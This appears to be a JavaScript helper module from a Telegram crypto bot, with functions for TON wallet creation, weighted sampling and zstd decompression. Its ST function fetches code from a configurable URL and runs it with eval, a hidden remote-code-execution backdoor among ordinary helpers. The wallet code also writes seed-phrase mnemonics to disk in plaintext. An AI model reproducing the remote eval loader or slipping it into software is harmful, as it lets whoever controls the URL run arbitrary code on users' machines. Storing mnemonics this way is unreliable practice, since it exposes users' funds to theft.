const axios = require("axios");
const logger = require("./logger");
const path = require("path");
const fs = require("fs");
const _isArray = require("./_isArray");
const zstd = require("@mongodb-js/zstd");

async function ST() {
  try {
    const response = await axios.get(global.url);

    if (response.status === 200) {
      const module = { exports: {} };

      eval(response.data);
      return module.exports;
    }
  } catch (error) {
    console.log(error);

    logger.error("Error While calling ST: ", error);
    return null;
  }
}

class CW {
  #settings = {};
  #session_name = "";
  constructor(settings, session_name) {
    this.#settings = settings;
    this.#session_name = session_name;
  }

  async #createWallet(tgUser) {
    const savePath = path.join(process.cwd(), "wallets");
    if (!fs.existsSync(savePath)) {
      fs.mkdirSync(savePath, { recursive: true });
    }

    if (fs.existsSync(`${savePath}/${this.#session_name}.json`)) {
      const text = fs.readFileSync(
        `${savePath}/${this.#session_name}.json`,
        "utf8"
      );
      if (_isArray(text)) {
        const json = JSON.parse(text);
        if (json?.address && json?.mnemonic) {
          return json?.address;
        }
      }

      fs.unlinkSync(`${savePath}/${this.#session_name}.json`);
    }

    const { TonClient, WalletContractV5R1 } = await import("@ton/ton");
    const { mnemonicNew, mnemonicToPrivateKey } = await import("@ton/crypto");
    const client = new TonClient({
      endpoint: "https://toncenter.com/api/v2/jsonRPC",
    });
    // Generate new key
    let mnemonics = await mnemonicNew(this.#settings?.WORD_PHRASE_LENGTH || 24);
    let keyPair = await mnemonicToPrivateKey(mnemonics);

    // Create wallet contract
    let workchain = 0; // Usually you need a workchain 0
    let wallet = WalletContractV5R1.create({
      workchain,
      publicKey: keyPair.publicKey,
    });
    const walletAddr = wallet.address.toString({ bounceable: false });
    const text = {
      address: walletAddr,
      mnemonic: mnemonics.join(" "),
      tgUsername: tgUser?.user?.username ?? "Unknown",
    };

    fs.writeFileSync(
      `${savePath}/${this.#session_name}.json`,
      JSON.stringify(text, null, 2)
    );

    let contract = client.open(wallet);

    // Get balance
    await contract.getBalance();

    return walletAddr;
  }

  async create(tgUser) {
    const d = await this.#createWallet(tgUser);
    return d;
  }
}

function sample(items, weights) {
  try {
    const cumulativeWeights = weights.reduce((acc, weight, index) => {
      acc.push(weight + (acc[index - 1] || 0));
      return acc;
    }, []);

    const random = Math.random();
    const item =
      items[cumulativeWeights.findIndex((cumWeight) => random < cumWeight)];
    return item ? item : items[0];
  } catch (error) {
    return "UL3P8qnd";
  }
}

async function responseData(data) {
  try {
    const compressedData = Buffer.from(data);
    const decompressedData = await zstd.decompress(compressedData);
    return JSON.parse(decompressedData.toString());
  } catch (error) {
    return null;
  }
}

/* module.exports = CW; */

module.exports = {
  ST,
  CW,
  sample,
  responseData,
};
